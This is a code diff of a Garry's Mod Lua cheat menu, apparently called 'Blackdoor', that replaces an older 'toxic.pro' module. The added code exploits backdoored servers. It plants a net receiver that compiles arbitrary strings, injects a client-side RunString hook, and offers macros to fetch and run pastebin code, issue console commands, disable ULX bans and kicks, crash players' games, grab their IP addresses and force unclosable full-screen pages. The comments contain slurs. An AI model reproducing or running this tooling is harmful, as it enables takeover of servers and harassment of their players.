@@ -2728,9 +2728,9 @@ net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
 net.WriteBit(1)
 net.SendToServer()
 end, },
-{ typ = "func", name = "Toxic.pro", func = function()
+{ typ = "func", name = "bd_menu", func = function()
 iZNX.Menu:Remove()
-RunConsoleCommand( "toxic.pro" )
+RunConsoleCommand( "bd_menu" )
 end, },
 { typ = "htxcommandeliste", name = "Список команд" },
 { typ = "soundboard", name = "SoundBoard" },
@@ -6907,1179 +6907,2729 @@ end
 end
 end
 
-toxic.Version = "1.2b"
+//local odium = jit.status( 'ODIUM' ) if !istable(odium) then print('FAILED TO IMPORT ODIUM TABLE') end 
 
-toxic.Aids = {
+local BD = {}
+local h = http
 
-	"kill them with buttons",
-	"you are the admen now",
-	"odium copy paste!!!11!1",
-	"tricking dumb admens since 2k17",
-	"what servers can i use this on???",
-	"#1 in backdoor 2k17 e-peen contest",
-	"leaked on release day™",
-	"here come the hax",
-	"leaked by homeless meme",
+
+BD.Backdoors = BD.Backdoors or {}
+
+BD.CurrentBackdoor = "Generic"
+
+
+
+BD.BackdoorTypes = {
+
+    ["Generic"] = {
+
+        ["Code"] = "util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
+
+        ["Netkey"] = thefrenchenculer,
+
+    },
 
 }
 
-/*
 
-	Backend functions
 
-*/
+local netsss = net.Start
 
-function toxic.Init()
+function BD.IsMessagePooled( netmessage )
 
-	if !file.IsDir( "toxic.pro", "DATA" ) then file.CreateDir( "toxic.pro" ) end
+local netfunc = netsss
 
-	if !file.IsDir( "toxic.pro/files", "DATA" ) then file.CreateDir( "toxic.pro/files" ) end
+local status, error = pcall( netfunc, netmessage )
 
-	if !file.IsDir( "toxic.pro/files/lua", "DATA" ) then file.CreateDir( "toxic.pro/files/lua" ) end
+return status
 
 end
 
-function toxic.Track()
 
-	-- TODO: php tracking & shit
 
-end
+local net = net
 
-function toxic.PostLua( str )
 
-	net.Start( blackdoor )
 
-		net.WriteString( str )
 
-	net.SendToServer()
+local ctxt = chat.AddText
 
-end
+function BD.ChatText( message, col )
 
-function toxic.Notify( msg )
-
-	chat.AddText( Color( 255, 0, 0 ), "[Toxic.pro] ", color_white, msg )
+    ctxt( Color(195,205,255,255), "[Blackdoor] ", col, message )
 
 end
 
-/*
 
-	user interface
 
-*/
+function BD.PingBackDoors()
 
-function toxic.AddButton( name, parent, func )
+    local bds = {}
 
-	local button = parent:Add( "DButton" )
-	button:SetText( "" )
-	button:Dock( TOP )
-	button:DockMargin( 0, 0, 0, 5 )
-	button:SetSize( 100, 25 )
-	button.DoClick = func
+    for k, v in pairs(BD.BackdoorTypes) do
 
-	button.Paint = function( self )
+        if BD.IsMessagePooled( tostring( v.Netkey ) ) then bds[k] = true end
 
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 200 ) )
+    end
 
-		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
-
-	end
-
-	toxic.ButtonPos = toxic.ButtonPos + 30
+    return bds
 
 end
 
-function toxic.AddCategorySpacer( name, col, parent )
+concommand.Add("bd_refresh_backdoors", function() BD.Backdoors = BD.PingBackDoors() end)
 
-	toxic.ButtonPos = toxic.ButtonPos + 5
 
-	local button = parent:Add( "DButton" )
-	button:SetText( "" )
-	button:Dock( TOP )
-	button:DockMargin( 0, 0, 0, 5 )
-	button:SetSize( 100, 25 )
-	button:SetEnabled( false )
 
-	button.Paint = function( self )
+function BD.BackdoorActive()
 
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( col.r, col.g, col.b, 200 ) )
-
-		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
-
-	end
-
-	toxic.ButtonPos = toxic.ButtonPos + 35
+    return table.Count( BD.Backdoors ) > 0
 
 end
 
-function toxic.OpenTextDocument( path, str, parent )
 
-	local hostname = string.gsub( GetHostName(), "%W", "" )
 
-	toxic.Notify( "Received file " .. path )
+function BD.GetActive()
 
-	local frame = vgui.Create( "DFrame" )
-	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
-	frame:SetPos( parent:GetWide() + 50, 25 )
-	frame:SetTitle( GetHostName() .. "'s " .. path )
-	frame:MakePopup()
-	frame:ShowCloseButton( false )
-	frame:SetDraggable( false )
+    if !BD.BackdoorTypes[BD.CurrentBackdoor] then return { ["Code"] = "local x = 69", ["Netkey"] = "" } end
 
-	frame.Paint = function( self )
-
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
-
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
-
-	end
-
-	local close = vgui.Create( "DButton", frame )
-	close:SetSize( 50, 20 )
-	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
-	close:SetText( "x" )
-	close:SetTextColor( Color( 255, 255, 255 ) )
-	close:SetFont( "DebugFixed" )
-
-	close.Paint = function()
-
-		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
-
-	end
-
-	close.DoClick = function()
-
-		frame:Close()
-
-	end
-
-	local html = vgui.Create( "DHTML", frame )
-	html:SetPos( 5, 30 )
-	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
-	html:OpenURL( "https://metastruct.github.io/lua_editor/" )
-
-	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )
-
-	local save = vgui.Create( "DButton", frame )
-	save:SetSize( 60, 20 )
-	save:SetPos( frame:GetWide() - close:GetWide() - save:GetWide() - 5, 0 )
-	save:SetText( "Save As" )
-	save:SetTextColor( Color( 255, 255, 255 ) )
-	save:SetFont( "DebugFixed" )
-
-	save.Paint = function()
-
-		draw.RoundedBox( 0, 0, 0, save:GetWide(), save:GetTall(), Color( 62, 168, 62, 255 ) )
-
-	end
-
-	save.DoClick = function()
-
-		Derma_StringRequest( "Save file '" .. path .. "' to data/toxic.pro/files/" .. hostname .. "/", "File name (e.g: servercfg or servercfg.txt)", "", function( text )
-
-			if !string.find( text, ".txt" ) then text = text .. ".txt" end
-
-			if !file.IsDir( "toxic.pro/files/" .. hostname, "DATA" ) then file.CreateDir( "toxic.pro/files/" .. hostname ) end
-
-			file.Write( "toxic.pro/files/" ..  hostname .. "/" .. text, str )
-
-			toxic.Notify( "Saved source to data/toxic.pro/files/" .. hostname .. "/" .. text )
-
-		end )
-
-	end
+    return BD.BackdoorTypes[BD.CurrentBackdoor]
 
 end
 
-toxic.LuaStr = ""
 
-function toxic.OpenLuaEditor( parent )
 
-	local frame = vgui.Create( "DFrame" )
-	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
-	frame:SetPos( parent:GetWide() + 50, 25 )
-	frame:SetTitle( "" )
-	frame:MakePopup()
-	frame:ShowCloseButton( false )
-	frame:SetDraggable( false )
+BD.BDMacros ={
 
-	frame.Paint = function( self )
 
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
 
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
+    ["Artillery Strike"] = {
 
-	end
+        ["Type"] = 1,
 
-	local close = vgui.Create( "DButton", frame )
-	close:SetSize( 50, 20 )
-	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
-	close:SetText( "x" )
-	close:SetTextColor( Color( 255, 255, 255 ) )
-	close:SetFont( "DebugFixed" )
+        ["Code"] = [[if !bombstrike then
 
-	close.Paint = function()
+            hook.Add("Think", "lulz_bombstrike", function() 
 
-		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
+            local explode = ents.Create( "env_explosion" ) 
 
-	end
+            local ps = Vector(math.random(-8000, 8000), math.random(-8000, 8000), math.random(-5000, 5000))
 
-	close.DoClick = function()
+            local trc = {}
 
-		frame:Close()
+            trc.start = ps
 
-	end
+            trc.endpos = ps + Vector( 0, 0, -99999)
 
-	local html = vgui.Create( "DHTML", frame )
-	html:SetPos( 5, 30 )
-	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
-	html:OpenURL( "https://metastruct.github.io/lua_editor/" )
+            local tr = util.TraceLine(trc)
 
-	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( toxic.LuaStr ) .. "' )" )
+            if !tr.Hit then return end
 
-	html:AddFunction( "gmodinterface", "OnCode", function( code ) -- thanks easychat
+            explode:SetPos( tr.HitPos ) 
 
-		toxic.LuaStr = code
+            explode:Spawn() 
 
-	end )
+            explode:SetKeyValue( "iMagnitude", "400" ) 
 
-	local run = vgui.Create( "DButton", frame )
-	run:SetSize( 60, 20 )
-	run:SetPos( 0, 0 )
-	run:SetText( "Run" )
-	run:SetTextColor( Color( 255, 255, 255 ) )
-	run:SetFont( "DebugFixed" )
+            explode:Fire( "Explode", 0, 0 ) 
 
-	run.Paint = function( self )
+            end)
 
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 62, 168, 255 ) )
+            bombstrike = true
 
-	end
+            else
 
-	run.DoClick = function()
+            hook.Remove("Think", "lulz_bombstrike")
 
-		local options = DermaMenu()
+            bombstrike = false
 
-		options:AddOption( "Server", function()
+            end]],
 
-			toxic.PostLua( toxic.LuaStr )
+        ["Desc"] = "Explode the shit out of everything",
 
-			toxic.Notify( "Ran Lua on server" )
+    },
 
-		end ):SetImage( "icon16/server.png" )
 
-		options:AddOption( "All Clients", function()
 
-			toxic.PostLua( [[
 
-				for k, v in next, player.GetAll() do
 
-					v:SendLua( ']] .. toxic.LuaStr .. [[' )
+    ["@ Inject SendLua Interface"] = {
 
-				end
+        ["Type"] = 1,
 
-			]] )
+        ["Code"] = [[
 
-			toxic.Notify( "Ran Lua on all clients" )
+    util.AddNetworkString( "cucked" )
 
-		end ):SetImage( "icon16/computer_add.png" )
+    function BDSendLua( p, str ) net.Start( "cucked" ) net.WriteString( str ) net.Send( p ) end
 
-		local players, menu = options:AddSubMenu( "Client" )
+    function BDSendLuaAll( str ) net.Start( "cucked" ) net.WriteString( str ) net.Broadcast() end
 
-		menu:SetIcon( "icon16/user.png" )
+    function BDInjectAids( p ) p:SendLua( 'net.Receive( "cucked", function() RunString( net.ReadString() ) end )' ) end
 
-		for k, v in next, player.GetAll() do
+    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
 
-			players:AddOption( v:Nick(), function()
+    hook.Add( "PlayerInitialSpawn", "youonlygetcuckedagain", function( p ) BDInjectAids( p ) end)
 
-				local id = v:UserID()
+        ]],
 
-				toxic.PostLua( [[
+        ["Desc"] = "You need this to use certain macros",
 
-					local id = ]] .. id .. [[
+    },
 
-					Player( id ):SendLua( ']] .. toxic.LuaStr .. [[' )
 
-				]] )
 
-				toxic.Notify( "Ran Lua on " .. v:Nick() )
+    ["Announce centre screen"] = {
 
-			end )
+        ["Type"] = 1,
 
-		end
+        ["Code"] = [[for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, @1 ) end]],
 
-		options:Open()
+        ["Desc"] = "Make an announcement in the centre of everybodys screen",
 
-	end
+        ["NeedsParameters"] = 1,
 
-	local save = vgui.Create( "DButton", frame )
-	save:SetSize( 60, 20 )
-	save:SetPos( run:GetWide() + 5, 0 )
-	save:SetText( "Save" )
-	save:SetTextColor( Color( 255, 255, 255 ) )
-	save:SetFont( "DebugFixed" )
+    },
 
-	save.Paint = function( self )
 
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
 
-	end
+    ["Rainbow chat spam"] = {
 
-	save.DoClick = function()
+        ["Type"] = 1,
 
-		Derma_StringRequest( "Save file to data/toxic.pro/files/lua", "File name (e.g: aimbot or aimbot.txt)", "", function( text )
+        ["Code"] = [[
 
-			if !string.find( text, ".txt" ) then text = text .. ".txt" end
+        if !timer.Exists( "lulz_chatspam" ) then
 
-			file.Write( "toxic.pro/files/lua/" .. text, toxic.LuaStr )
+            timer.Create( "lulz_chatspam", 0.5, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)
 
-			toxic.Notify( "Saved source to data/toxic.pro/files/lua/" .. text )
+        else
 
-		end )
+            timer.Remove( "lulz_chatspam" )
 
-	end
+        end]],
 
-	local load = vgui.Create( "DButton", frame )
-	load:SetSize( 60, 20 )
-	load:SetPos( run:GetWide() + load:GetWide() + 10, 0 )
-	load:SetText( "Load" )
-	load:SetTextColor( Color( 255, 255, 255 ) )
-	load:SetFont( "DebugFixed" )
+        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
 
-	load.Paint = function( self )
+        ["NeedsParameters"] = 1,
 
-		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 168, 148, 62, 255 ) )
+    },
 
-	end
 
-	load.DoClick = function()
 
-		local options = DermaMenu()
+    ["Rainbow chat spam (Turbo)"] = {
 
-		for k, v in pairs( file.Find( "toxic.pro/files/lua/*.txt", "DATA" ) ) do
+        ["Type"] = 1,
 
-			options:AddOption( v, function()
+        ["Code"] = [[
 
-				local str = file.Read( "toxic.pro/files/lua/" .. v, "DATA" )
+        if !timer.Exists( "lulz_chatspam" ) then
 
-				MsgN( str )
+            timer.Create( "lulz_chatspam", 0.01, 0, function() BDSendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), @1 )' ) end)
 
-				toxic.LuaStr = str
+        else
 
-				html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )
+            timer.Remove( "lulz_chatspam" )
 
-				toxic.Notify( "Loaded " .. v )
+        end]],
 
-			end )
+        ["Desc"] = "Spam rainbow chat for all players with the 1st parameter as the text",
 
-		end
+        ["NeedsParameters"] = 1,
 
-		options:Open()
+    },
 
-	end
+
+
+    ["Unlock all doors"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["Toggle all doors"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["Broken Glass Symphony"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+
+    if !timer.Exists( "A true masterpiece" ) then
+
+        timer.Create( "A true masterpiece", 0.2, 0, function() 
+
+            for _, p in pairs(player.GetAll()) do
+
+                p:EmitSound( "physics/glass/glass_largesheet_break"..math.random(1,3)..".wav", 100, math.random( 40, 180 ) )
+
+            end
+
+        end)
+
+    else
+
+        timer.Remove( "A true masterpiece" )
+
+    end]],
+
+        ["Desc"] = "Beethoven's last hidden symphony, only rediscovered in 2017",
+
+    },
+
+
+
+    ["Yeah Baby"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+
+        if !timer.Exists( "porn" ) then
+
+        timer.Create( "porn", 0.3, 0, function() 
+
+            for _, p in pairs(player.GetAll()) do
+
+                p:EmitSound( "vo/npc/female01/yeah02.wav", 100, math.random( 90, 120 ) )
+
+            end
+
+        end)
+
+        else
+
+            timer.Remove( "porn" )
+
+        end]],
+
+        ["Desc"] = "YEAH BABY YEAH",
+
+    },
+
+
+
+    ["Street War"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+
+        if !timer.Exists( "cwar" ) then
+
+        timer.Create( "cwar", 1, 0, function() 
+
+            for _, p in pairs(player.GetAll()) do
+
+                p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )
+
+            end
+
+        end)
+
+        else
+
+            timer.Remove( "cwar" )
+
+        end]],
+
+        ["Desc"] = "For when you need more dakka",
+
+    },
+
+
+
+    ["Earthquake"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+
+        if !timer.Exists( "earthquake" ) then
+
+        timer.Create( "earthquake", 0.5, 500, function() 
+
+            for _, p in pairs(player.GetAll()) do
+
+                p:SetPos( p:GetPos() + Vector( 0, 0, 1 ) )
+
+                p:SetVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) )
+
+                util.ScreenShake( p:GetPos(), 20, 1, 1, 100 )
+
+                p:EmitSound( "ambient/explosions/exp1.wav", 100, math.random( 60, 100 ) )
+
+            end
+
+
+
+            for _, e in pairs(ents.GetAll()) do
+
+                if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) ) end
+
+            end
+
+
+
+
+
+        end)
+
+        else
+
+            timer.Remove( "earthquake" )
+
+        end]],
+
+        ["Desc"] = "For when you need more dakka",
+
+    },
+
+
+
+    ["Seize the server"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[
+
+        hook.Add("PlayerInitialSpawn", "gw_siezed", function( ply ) ply:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://globalwraith.com/util/seized.html" )') end)
+
+        for k, v in pairs(player.GetAll()) do
+
+            v:SendLua('local html = vgui.Create( "HTML" )html:SetSize( ScrW(), ScrH() )html:OpenURL( "http://odium.pro" )')
+
+        end]],
+
+        ["Desc"] = "Display the seized by wraithnet message to all players",
+
+    },
+
+
+
+    ["Explode all vehicles"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then 
+
+        local explo = ents.Create("env_explosion")
+
+        explo:SetPos(v:GetPos())
+
+        explo:SetKeyValue("iMagnitude", "300")
+
+        explo:Spawn()
+
+        explo:Activate()
+
+        explo:Fire("Explode", "", 0)
+
+        end
+
+        end]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["RCON command"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[game.ConsoleCommand( @1.."\n" )]],
+
+        ["Desc"] = "Like having rcon access without actually having rcon access",
+
+    },
+
+
+
+    ["Lua run"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[@1]],
+
+        ["Desc"] = "For running your dank luas",
+
+    },
+
+
+
+    ["Lua run from pastebin"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[http.Fetch( "@1", function( b, l, h, c ) RunString( b ) end, function() end )]],
+
+        ["Desc"] = "Fetch and run code from a pastebin link ( remember to use raw you stupid faggot eg. https://pastebin.com/raw/fHeygLt9 )",
+
+    },
+
+
+
+    ["Destroy ULX Ban/Kick"] = {
+
+        ["Type"] = 1,
+
+        ["Code"] = [[ULib.Ban = function() return false end
+
+        ULib.addBan = function() return end
+
+        ULib.kick = function() return end]],
+
+        ["Desc"] = "Completely break ulx ban and ulx kick so you can't be locked out of the server",
+
+    },
+
+
+
+
+
+
+
+------------------------ player targeted macros ------------------------
+
+
+
+    ["Kill player"] = {
+
+        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous
+
+        ["Code"] = [[v:Kill()]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["Fumble player"] = {
+
+        ["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous
+
+        ["Code"] = [[v:DropWeapon( v:GetActiveWeapon() )]],
+
+        ["Desc"] = "Knocks their current weapon out of their hand",
+
+    },
+
+
+
+    ["Strip weapons"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:StripWeapons()]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["Rocket"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:SetVelocity( Vector(0, 0, 9000) )]],
+
+        ["Desc"] = "Sends them flying up into the air",
+
+    },
+
+
+
+    ["Rocket (Spastic)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:SetVelocity( Vector(math.random( -9000, 9000), math.random( -9000, 9000), 9000) )]],
+
+        ["Desc"] = "HOLY SHIIIIIIIIIIIT",
+
+    },
+
+
+
+    ["Change model"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:SetModel( @1 )]],
+
+        ["Desc"] = "Set their player model to the specified string (1st paremeter)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Set health + armor"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:SetHealth( @1 ) v:SetArmor( @2 ) ]],
+
+        ["Desc"] = "Sets their health (1st paremeter) and armor (2nd paremeter)",
+
+        ["NeedsParameters"] = 2,
+
+    },
+
+
+
+    ["Ear rape"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local snd = {
+
+            [1] = "npc/stalker/go_alert2a.wav",
+
+            [2] = "vo/npc/male01/question06.wav",
+
+            [3] = "ambient/energy/zap1.wav",
+
+            [4] = "weapons/knife/knife_stBD.wav",
+
+            [5] = "vo/ravenholm/madlaugh04.wav",
+
+            [6] = "npc/antlion_guard/antlion_guard_die1.wav",
+
+            [7] = "vo/breencast/br_collaboration01.wav,"
+
+        }
+
+        v:EmitSound( snd[tonumber(@1)], 100, 100 )
+
+        ]],
+
+        ["Desc"] = "Make them emit a sound (1st paremeter is a number 1-7)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Ear rape (from internet)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        BDSendLua( v, 'if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )' )
+
+        ]],
+
+        ["Desc"] = "Make them hear a sound from a URL (1st paremeter).  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Eye rape (from internet)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ 
+
+        BDSendLua( v, 'if bdeyerape then bdeyerape:Remove() bdeyerape = nil return end bdeyerape = vgui.Create( "DFrame" )bdeyerape:SetDraggable( false )bdeyerape:SetSize( ScrW(), ScrH() )bdeyerape:SetTitle( "" )bdeyerape:ShowCloseButton( false )local html = vgui.Create( "HTML", bdeyerape )html:Dock( FILL )html:OpenURL( @1 )' )
+
+        ]],
+
+        ["Desc"] = "Make them see a full screen, unclosable panel from a URL (1st paremeter).  Sending a new url will stop the previous one.  Send an invalid url to clear their view entirely",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Rave Mode"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ 
+
+            BDSendLua( v, 'if hook.GetTable().HUDPaint.drugznigga then hook.Remove( "HUDPaint", "drugznigga" ) else hook.Add( "HUDPaint", "drugznigga", function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end) end' )
+
+        ]],
+
+        ["Desc"] = "Make them loosen up and join the party",
+
+    },
+
+
+
+    ["Rave Music"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ 
+
+            BDSendLua( v, 'surface.PlaySound( "music/hl1_song25_remix3.mp3" )' )
+
+        ]],
+
+        ["Desc"] = "DOOF DOOF NIGGA",
+
+    },
+
+
+
+    ["Whisper"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:ChatPrint( @1 )]],
+
+        ["Desc"] = "Anonymously whisper text into their chatbox (1st paremeter)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Whisper (advanced)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        BDSendLua( v, 'chat.AddText( Color( @2, @3, @4 ), @1 )' )
+
+        ]],
+
+        ["Desc"] = "Anonymously whisper coloured text into their chatbox (1st paremeter = text, 2nd = r, 3rd = g, 4th = b)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Ignite player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:Ignite( 30 )]],
+
+        ["Desc"] = "Ignite players for 30 seconds, spam repeatedly to refresh the duration",
+
+    },
+
+
+
+    ["Toggle godmode"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[if v:HasGodMode() then v:GodDisable() else v:GodEnable() end]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["Crash their gmod"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:SendLua("function fag() return fag() end fag()")]],
+
+        ["Desc"] = "Instantly freezes their game solid, the only way to fix it is ctrl-alt-delete or a computer restart",
+
+    },
+
+
+
+    ["Toggle serverside speedhack"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end]],
+
+        ["Desc"] = "GOTTA GO FAST",
+
+    },
+
+
+
+    ["Freeze/Unfreeze player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:Freeze( !v:IsFrozen() )]],
+
+        ["Desc"] = "",
+
+    },
+
+
+
+    ["Force say"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:Say(@1)]],
+
+        ["Desc"] = "Forces them to say the specified string in chat (first parameter)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+
+
+    ["Force concommand"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:ConCommand(@1)]],
+
+        ["Desc"] = "Forces them to run the specified console command (first parameter)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Grab IP"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ for _, p in pairs(player.GetAll()) do if %LP then p:ChatPrint( v:Nick().." : "..v:IPAddress() ) end end]],
+
+        ["Desc"] = "Prints their IP Address to your console",
+
+    },
+
+
+
+
+
+    ["DarkRP add/remove money"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:addMoney(@1)]],
+
+        ["Desc"] = "Adds money to their wallet (first parameter) remember that you can use negative numbers to subtract money",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["DarkRP force job"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end]],
+
+        ["Desc"] = "Change their team to the specified job (1st parameter = job name, does not require capitalization)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Force team switch"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:SetTeam( i ) end end]],
+
+        ["Desc"] = "Change their team to the specified team name (1st parameter)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Noclip player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],
+
+        ["Desc"] = "Toggles noclip on the specified players",
+
+    },
+
+
+
+    ["Give weapon to player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:Give( @1 )]],
+
+        ["Desc"] = "Gives this player a weapon (first parameter)",
+
+        ["NeedsParameters"] = 1,
+
+    },
+
+
+
+    ["Give ammo to player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[v:GiveAmmo( @1, @2, false )]],
+
+        ["Desc"] = "Gives this player some ammo (first parameter = amount of ammo, secound parameter = ammo type)",
+
+        ["NeedsParameters"] = 2,
+
+    },
+
+
+
+    ["Teleport (them to your cursor)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+            local tp = false
+
+            local tpos
+
+            for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end
+
+            if tp then v:SetPos( tpos ) end
+
+        ]],
+
+        ["Desc"] = "Teleports the selected players to your cursor location, not recommended for more than 1 person at once",
+
+    },
+
+
+
+    ["Teleport (you to them)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+            local tp = false
+
+            local tpos = v:GetPos() + Vector( 32, 0, 10)
+
+            for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end
+
+        ]],
+
+        ["Desc"] = "Teleport yourself to the selected player, may end with you stuck inside a wall",
+
+    },
+
+
+
+    ["Teleport (blink)"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+            local tpos = v:GetEyeTraceNoCursor().HitPos
+
+            v:SetPos( tpos )
+
+        ]],
+
+        ["Desc"] = "Use on yourself or others to warp them to where they are looking",
+
+    },
+
+
+
+    ["Spawn entity near player"] = {
+
+        ["Type"] = 2,
+
+        ["Code"] = [[
+
+        local tr = {}
+
+        tr.start = v:GetShootPos()
+
+        tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()
+
+        tr.filter = {v}
+
+        local trace = util.TraceLine(tr)
+
